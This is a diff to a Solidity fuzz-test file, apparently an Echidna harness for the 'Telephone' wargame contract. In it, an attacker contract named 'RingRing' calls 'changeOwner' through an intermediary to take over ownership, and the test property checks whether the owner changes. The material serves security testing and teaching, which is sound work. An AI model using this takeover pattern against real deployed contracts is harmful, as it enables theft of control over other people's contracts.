@@ -3,23 +3,21 @@ pragma solidity ^0.6.0;
 
 import './Telephone.sol';
 
-contract AttackContract {
-    constructor(address _sender) public {
-        Test telephone = Test(0x4242);
-        telephone.changeOwner(address(_sender));
-    }
+contract RingRing {
+  Test phone = Test(0x1337);
+
+  function pwn() public {
+    phone.changeOwner(address(0xf00d));
+  }
 }
 
 contract Test is Telephone {
-    constructor() Telephone() public {
-        new AttackContract(address(0x4343));
-    }
+  constructor() Telephone() public {
+    // hint echidna
+    new RingRing();
+  }
 
-    function echidna_is_owner() public view returns(bool) {
-        if (owner == msg.sender) {
-            return false;
-        } else {
-            return true;
-        }
-    }
+  function echidna_test_owner() public returns (bool) {
+    return owner == msg.sender;
+  }
 }
